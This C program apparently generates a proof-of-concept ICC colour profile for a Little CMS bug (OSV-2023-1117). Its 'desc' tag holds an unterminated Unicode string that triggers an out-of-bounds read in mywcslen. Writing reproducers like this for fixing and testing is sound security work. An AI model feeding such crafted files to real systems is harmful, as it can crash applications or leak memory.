/*
 * PoC generator for OSV-2023-1117
 *
 * Crafts an ICC profile with a 'desc' tag (cmsSigTextDescriptionType = 0x64657363)
 * that has a non-zero UnicodeCount but the UnicodeString data fills the entire
 * buffer with non-zero values (no null terminator). When cmsMLUsetWide calls
 * mywcslen on this unterminated wchar_t array, it reads past the buffer.
 *
 * The 'desc' tag binary layout:
 *   [0..3]   tag type sig: 'desc' = 0x64657363
 *   [4..7]   reserved (0)
 *   [8..11]  AsciiCount (uint32 BE)
 *   [12..12+AsciiCount-1]  ASCII text
 *   [12+AsciiCount..+3]    UnicodeCode (uint32 BE)
 *   [+4..+7]               UnicodeCount (uint32 BE)  <-- controls allocation
 *   [+8..+8+UnicodeCount*2-1]  Unicode data (uint16 BE array, no null term)
 *
 * We patch test5.icc's existing 'desc' tag to have UnicodeCount pointing to
 * data with no null terminator.
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>

static void w32(uint8_t *p, uint32_t v) {
    v = htonl(v);
    memcpy(p, &v, 4);
}

static void w16(uint8_t *p, uint16_t v) {
    v = htons(v);
    memcpy(p, &v, 2);
}

static uint32_t r32(const uint8_t *p) {
    uint32_t v;
    memcpy(&v, p, 4);
    return ntohl(v);
}

int main(void) {
    /*
     * We'll build a minimal ICC profile from scratch with a crafted 'desc' tag.
     * The profile needs:
     *   - Valid 128-byte header
     *   - Tag table with 1 tag: 'desc'
     *   - desc tag data with unterminated Unicode string
     */

    /* Total size: 128 (header) + 4 (tag count) + 12 (1 tag entry) + desc_data */
    /* desc tag data: 4(type) + 4(reserved) + 4(ascii_count) + ascii_data +
     *               4(unicode_code) + 4(unicode_count) + unicode_data */
    int ascii_count = 5; /* "Test\0" */
    int unicode_count = 8; /* 8 wchar_t values, NO null terminator */

    int desc_offset = 128 + 4 + 12;
    int desc_size = 4 + 4 + 4 + ascii_count + 4 + 4 + unicode_count * 2;
    int total = desc_offset + desc_size;

    /* Pad to 4-byte alignment */
    if (total % 4) total += 4 - (total % 4);

    uint8_t *buf = calloc(1, total);

    /* === ICC Header (128 bytes) === */
    w32(buf + 0, total);                /* profile size */
    w32(buf + 4, 0x6C636D73);          /* 'lcms' CMM */
    w32(buf + 8, 0x02100000);          /* version 2.1.0 */
    w32(buf + 12, 0x6D6E7472);         /* device class: 'mntr' (display) */
    w32(buf + 16, 0x52474220);         /* color space: 'RGB ' */
    w32(buf + 20, 0x58595A20);         /* PCS: 'XYZ ' */
    w32(buf + 36, 0x61637370);         /* magic: 'acsp' */

    /* === Tag table === */
    int pos = 128;
    w32(buf + pos, 1);                 /* tag count = 1 */
    pos += 4;

    /* Tag entry: 'desc' */
    w32(buf + pos, 0x64657363);        /* sig: 'desc' */
    w32(buf + pos + 4, desc_offset);   /* offset */
    w32(buf + pos + 8, desc_size);     /* size */
    pos += 12;

    /* === desc tag data === */
    int dp = desc_offset;
    w32(buf + dp, 0x64657363);         /* type sig: 'desc' */
    dp += 4;
    w32(buf + dp, 0);                  /* reserved */
    dp += 4;

    /* ASCII part */
    w32(buf + dp, ascii_count);        /* AsciiCount */
    dp += 4;
    memcpy(buf + dp, "Test", 4);
    buf[dp + 4] = 0;                   /* null terminator for ASCII */
    dp += ascii_count;

    /* Unicode part */
    w32(buf + dp, 0x00000000);         /* UnicodeCode (any) */
    dp += 4;
    w32(buf + dp, unicode_count);      /* UnicodeCount = 8 (NO null term) */
    dp += 4;

    /* Fill unicode data with non-zero values (all 0x4141 = 'AA') */
    for (int i = 0; i < unicode_count; i++) {
        w16(buf + dp, 0x4141);
        dp += 2;
    }
    /* NO null terminator -- this is the bug trigger */

    FILE *f = fopen("poc.icc", "wb");
    if (!f) { perror("fopen"); return 1; }
    fwrite(buf, 1, total, f);
    fclose(f);
    free(buf);

    printf("Written poc.icc (%d bytes) with unterminated Unicode in desc tag\n", total);
    return 0;
}
